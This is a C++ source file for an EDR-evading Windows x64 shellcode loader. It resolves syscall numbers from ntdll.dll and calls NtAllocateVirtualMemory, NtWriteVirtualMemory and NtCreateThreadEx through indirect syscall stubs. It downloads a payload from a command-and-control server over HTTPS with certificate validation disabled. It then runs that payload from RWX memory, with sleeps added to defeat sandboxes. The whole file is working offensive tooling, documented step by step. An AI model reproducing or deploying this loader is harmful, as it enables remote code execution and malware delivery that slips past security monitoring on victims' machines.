/**
 * @file indirect_syscall_loader.cpp
 * @brief A stealthy shellcode loader for Windows x64.
 *
 * @details This program demonstrates advanced evasion techniques to load and execute shellcode
 * while bypassing common security monitoring tools like EDRs and antivirus. Its core
 * strategy revolves around "Indirect Syscalls," which avoids making direct calls to high-level
 * Windows API functions (e.g., `VirtualAlloc`, `CreateThread`) that are easily hooked.
 *
 * Instead, it dynamically resolves the System Service Numbers (SSNs) for the required
 * NTAPI functions from `ntdll.dll` at runtime. It then uses custom assembly stubs to
 * execute the `syscall` instruction directly, effectively communicating with the Windows
 * kernel without touching the monitored user-mode APIs.
 *
 * The process is as follows:
 * 1.  **Dynamic Syscall Resolution**: At startup, it inspects `ntdll.dll` in memory to find the
 *     SSNs and syscall instruction addresses for necessary kernel functions.
 * 2.  **Remote Payload Fetching**: It downloads the shellcode from a remote server over HTTPS
 *     using the WinINet library.
 * 3.  **Stealthy Memory Allocation**: It uses a direct syscall to `NtAllocateVirtualMemory` to
 *     allocate an executable memory region for the shellcode.
 * 4.  **Shellcode Injection**: It uses a direct syscall to `NtWriteVirtualMemory` to copy the
 *     downloaded payload into the allocated memory.
 * 5.  **Threaded Execution**: It uses a direct syscall to `NtCreateThreadEx` to create a new
 *     thread, starting execution at the beginning of the shellcode.
 * 6.  **Execution & Cleanup**: It waits for the shellcode to finish and then cleans up handles.
 *

 */

#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <string> // for std::stoi

 // Instruct the linker to include the 'wininet.lib' library, which is required
 // for using networking functions like InternetOpenA, InternetConnectA, etc.
#pragma comment(lib, "wininet.lib")

//==============================================================================================
// GLOBAL VARIABLES FOR ASSEMBLY STUBS
//==============================================================================================
/**
 * @brief These global variables act as a bridge between this C++ code and the external
 * assembly (`.asm`) file. They store the dynamically resolved System Service Number (SSN)
 * and the memory address of the `syscall` instruction for each required NTAPI function.
 *
 * The `extern "C"` linkage specification prevents C++ name mangling, ensuring that the
 * assembly code can access these variables by their declared names. This mechanism allows
 * the assembly stubs to be generic, with the specific syscall details being "injected"
 * from the C++ side at runtime.
 */

 // Holds the SSN for NtAllocateVirtualMemory, resolved at runtime.
extern "C" DWORD      wNtAllocateVirtualMemory = 0;
// Holds the address of the `syscall` instruction within NtAllocateVirtualMemory.
extern "C" UINT_PTR   sysAddrNtAllocateVirtualMemory = 0;

// Holds the SSN for NtWriteVirtualMemory, resolved at runtime.
extern "C" DWORD      wNtWriteVirtualMemory = 0;
// Holds the address of the `syscall` instruction within NtWriteVirtualMemory.
extern "C" UINT_PTR   sysAddrNtWriteVirtualMemory = 0;

// Holds the SSN for NtCreateThreadEx, resolved at runtime.
extern "C" DWORD      wNtCreateThreadEx = 0;
// Holds the address of the `syscall` instruction within NtCreateThreadEx.
extern "C" UINT_PTR   sysAddrNtCreateThreadEx = 0;

// Holds the SSN for NtWaitForSingleObject, resolved at runtime.
extern "C" DWORD      wNtWaitForSingleObject = 0;
// Holds the address of the `syscall` instruction within NtWaitForSingleObject.
extern "C" UINT_PTR   sysAddrNtWaitForSingleObject = 0;

//==============================================================================================
// EXTERNAL ASSEMBLY FUNCTION PROTOTYPES
//==============================================================================================
/**
 * @brief Prototypes for the low-level syscall functions implemented in a separate assembly file.
 * These functions are C-style wrappers around the raw `syscall` instruction. Each function
 * is responsible for setting up the CPU registers (RAX, RCX, RDX, R8, R9, etc.) with the
 * correct arguments according to the x64 calling convention before executing the `syscall`.
 * This is the core of the indirect syscall technique.
 */

 // Assembly wrapper to invoke the NtAllocateVirtualMemory syscall.
extern "C" NTSTATUS allocate(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
// Assembly wrapper to invoke the NtWriteVirtualMemory syscall.
extern "C" NTSTATUS writeMem(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
// Assembly wrapper to invoke the NtCreateThreadEx syscall.
extern "C" NTSTATUS createThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
// Assembly wrapper to invoke the NtWaitForSingleObject syscall.
extern "C" NTSTATUS waitFor(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

using namespace std;

/**
 * @brief Dynamically resolves the SSN and syscall instruction address for a given NTAPI function.
 *
 * @details This function circumvents API hooking by reading the necessary information directly
 * from the in-memory `ntdll.dll` module. It finds the function's starting address and then
 * reads bytes at specific, known offsets to extract the SSN and the address of the `syscall`
 * instruction. This method is more robust than hardcoding SSNs, which can change between
 * Windows versions and even patch levels.
 *
 * @param funcName The name of the target NTAPI function (e.g., "NtAllocateVirtualMemory").
 * @param ssnOut   A reference to a DWORD variable where the extracted SSN will be stored.
 * @param addrOut  A reference to a UINT_PTR variable where the syscall instruction address will be stored.
 */
void extractSyscallInfo(LPCSTR funcName, DWORD& ssnOut, UINT_PTR& addrOut) {
    // Get a handle to the already loaded ntdll.dll module.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    // Find the starting address of the target function within ntdll's memory space.
    UINT_PTR funcAddr = (UINT_PTR)GetProcAddress(hNtdll, funcName);

    // In modern x64 Windows, the prologue of NTAPI functions in ntdll.dll follows a
    // predictable pattern. The SSN is loaded into the EAX register.
    // The instruction is `mov eax, <SSN>`, and the SSN value itself is at a 4-byte offset.
    ssnOut = *(DWORD*)(funcAddr + 4);

    // The `syscall` instruction itself is typically located at a fixed offset (0x12 or 18 bytes)
    // from the function's start. We capture this address for our assembly stub to jump to.
    addrOut = funcAddr + 0x12;

    // Print the resolved information for debugging and verification.
    cout << funcName << " -> SSN: " << dec << ssnOut
        << ", Syscall address: 0x" << hex << addrOut << endl;
}

/**
 * @brief Downloads a payload from a specified URL using HTTPS via the WinINet library.
 *
 * @details This function handles the networking part of the loader. It establishes a secure
 * HTTPS connection to a remote server and downloads the content from the specified path.
 * It includes flags to bypass common SSL certificate validation errors (e.g., self-signed
 * certs), which is highly useful for command-and-control (C2) infrastructure in testing environments.
 *
 * @param urlHost The hostname or IP address of the C2 server (e.g., "192.168.100.192").
 * @param urlPath The path to the payload on the server (e.g., "/payload.bin").
 * @param port    The port for the HTTPS connection, typically 443.
 * @param buffer  A pointer to the destination buffer where the downloaded data will be stored.
 * @param bufferSize The maximum size of the destination buffer in bytes.
 * @return The total number of bytes successfully downloaded. Returns 0 on any failure.
 */
DWORD downloadShellcode(const char* urlHost, const char* urlPath, INTERNET_PORT port, unsigned char* buffer, DWORD bufferSize) {
    
    // Initialize a WinINet session with a generic user agent.
    HINTERNET hInternet = InternetOpenA("WinINet Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        cerr << "InternetOpenA failed with error: " << GetLastError() << endl;
        return 0;
    }

    // Establish a connection to the target server.
    HINTERNET hConnect = InternetConnectA(hInternet, urlHost, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        cerr << "InternetConnectA failed with error: " << GetLastError() << endl;
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Define flags for the HTTPS request.
    // INTERNET_FLAG_SECURE: Crucial flag to enable SSL/TLS for a secure connection.
    // INTERNET_FLAG_RELOAD: Forces a fresh download from the server, ignoring any cached versions.
    // INTERNET_FLAG_IGNORE_CERT_*: Bypasses SSL certificate validation.
    //   (Warning: Insecure for production, but useful for C2 with self-signed certificates).
    DWORD requestFlags = INTERNET_FLAG_SECURE |
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    // This flag specifically helps bypass errors from unknown certificate authorities.
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;

    // Create an HTTPS GET request object.
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", urlPath, NULL, NULL, NULL, requestFlags, 0);
    // Apply the security option to ignore unknown CA errors.
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    if (!hRequest) {
        cerr << "HttpOpenRequestA failed with error: " << GetLastError() << endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Send the prepared request to the server.
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        cerr << "HttpSendRequestA failed with error: " << GetLastError() << endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    // Read the server's response data in a loop until the download is complete.
    DWORD totalBytesRead = 0, bytesRead = 0;
    while (InternetReadFile(hRequest, buffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
    }

    // Clean up all opened WinINet handles in reverse order of creation.
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return totalBytesRead;
}

/**
 * @brief Main entry point of the program.
 *
 * @details This function orchestrates the entire shellcode loading and execution process.
 * It follows a sequence of operations designed to be stealthy and resilient.
 */
int main(int argc,char* argv[]) {



    if (argc != 4) {
        cerr << "[-] Incorrect usage." << endl;
        cerr << "[!] Usage: " << argv[0] << " <HOST> <PATH> <PORT>" << endl;
        cerr << "[!] Example: " << argv[0] << " 192.168.100.192 /code.bin 443" << endl;
        return 1; 
    }

 
    // Covert Port args from a char to an int;
    INTERNET_PORT port;
    try {
        port = static_cast<INTERNET_PORT>(stoi(argv[3]));
    }
    catch (const invalid_argument& e) {
        cerr << "[-] Invalid port number provided: " << argv[3] << endl;
        return 1;
    }
    catch (const out_of_range& e) {
        cerr << "[-] Port number is out of range: " << argv[3] << endl;
        return 1;
    }



    // A stack-based buffer to temporarily hold the downloaded shellcode.
    // A larger size might be needed for more complex payloads.
    unsigned char shellcode[4096];

    // STEP 1: Dynamically resolve syscall information from ntdll.dll.
    // This is done first to prepare the necessary components for our direct syscalls.
    cout << "[*] Resolving syscall numbers and addresses from ntdll.dll..." << endl;
    extractSyscallInfo("NtAllocateVirtualMemory", wNtAllocateVirtualMemory, sysAddrNtAllocateVirtualMemory);
    extractSyscallInfo("NtWriteVirtualMemory", wNtWriteVirtualMemory, sysAddrNtWriteVirtualMemory);
    extractSyscallInfo("NtCreateThreadEx", wNtCreateThreadEx, sysAddrNtCreateThreadEx);
    extractSyscallInfo("NtWaitForSingleObject", wNtWaitForSingleObject, sysAddrNtWaitForSingleObject);

    // STEP 2: Download the shellcode from the remote C2 server.
    // 192.168.100.192 /code.bin 443
    DWORD totalBytesRead = downloadShellcode(argv[1], argv[2], port, shellcode, sizeof(shellcode));
    if (totalBytesRead == 0) {
        cerr << "[-] Failed to download shellcode. Aborting." << endl;
        return 1;
    }
    cout << "[+] Downloaded " << dec << totalBytesRead << " bytes of shellcode." << endl;

    // Anti-sandbox/analysis technique: A simple delay. Some automated analysis tools
    // might terminate a process if it appears to be idle for too long.
    Sleep(3000);

    // STEP 3: Allocate a new page of virtual memory with Read/Write/Execute permissions.
    // We request a standard page size (4KB or 0x1000 bytes).
    SIZE_T buffSize = 0x1000;
    PVOID allocBuffer = nullptr;
    // We use our custom assembly function `allocate` instead of `VirtualAlloc`.
    // (HANDLE)-1 refers to the current process.
    NTSTATUS status = allocate((HANDLE)-1, &allocBuffer, 0, &buffSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        cerr << "[-] Memory allocation failed. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }
    cout << "[+] Memory allocated at address: " << allocBuffer << endl;
    Sleep(3000);

    // STEP 4: Write the downloaded shellcode into the newly allocated memory region.
    SIZE_T bytesWritten = 0;
    // We use our custom assembly function `writeMem` instead of `WriteProcessMemory`.
    status = writeMem((HANDLE)-1, allocBuffer, shellcode, totalBytesRead, &bytesWritten);
    if (status != 0) {
        cerr << "[-] Failed to write to memory. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }
    cout << "[+] Wrote " << bytesWritten << " bytes to the allocated memory." << endl;
    Sleep(1000);

    // STEP 5: Create a new thread to execute the shellcode.
    HANDLE hThread = NULL;
    // We use our custom assembly function `createThread` instead of `CreateThread`.
    // The new thread's starting address (`StartRoutine`) is the beginning of our shellcode buffer.
    status = createThread(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0 || hThread == NULL) {
        cerr << "[-] Thread creation failed. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }
    cout << "[+] Thread created successfully. Executing payload." << endl;

    // STEP 6: Wait for the shellcode thread to finish its execution.
    // This is important for cleanup and to ensure the main program doesn't exit prematurely.
    waitFor(hThread, FALSE, NULL);
    // Close the thread handle to release system resources.
    CloseHandle(hThread);

    cout << "[+] Execution finished." << endl;
    return 0;
}
